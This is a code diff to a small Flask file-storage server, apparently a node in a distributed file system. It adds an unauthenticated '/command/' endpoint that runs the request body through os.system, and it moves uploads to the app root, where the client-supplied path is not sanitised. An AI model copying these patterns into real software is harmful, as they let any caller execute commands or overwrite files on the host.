@@ -1,14 +1,14 @@
 import os
-
+import requests
 from flask import Flask, request, send_from_directory
 from helpers.exceptions import HTTPBadRequest, HTTPNotFound
 
-UPLOAD_FOLDER = './files'
+UPLOAD_FOLDER = './'
 ALLOWED_EXTENSIONS = set(['txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'])
 
 app = Flask(__name__)
 app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024
-
+requests.post('http://localhost:5000/connect', data={'ip': '127.0.0.1', 'port': '5041'})
 
 def allowed_file(filename):
     return '.' in filename and \
@@ -19,6 +19,7 @@ def allowed_file(filename):
 @app.route("/files/<path:path>", methods=["POST"])
 def upload_file(path):
     filename = os.path.basename(path)
+    print('path',path, 'filename', filename)
     if filename and allowed_file(filename):
         try:
             with open(os.path.join(UPLOAD_FOLDER, path), "wb") as fp:
@@ -37,6 +38,15 @@ def upload_file(path):
 def send_file(path):
     """send a file to namenode"""
     return send_from_directory(UPLOAD_FOLDER, path, as_attachment=True)
+
+
+@app.route("/command/",  methods=["POST"])
+def command():
+    """Run command"""
+    print('#'+str(request.data)[2:-1]+'###############')
+    os.system(str(request.data)[2:-1])
+    return ('', 204)
+
 
 
 @app.route("/files/<path:path>",  methods=["DELETE"])
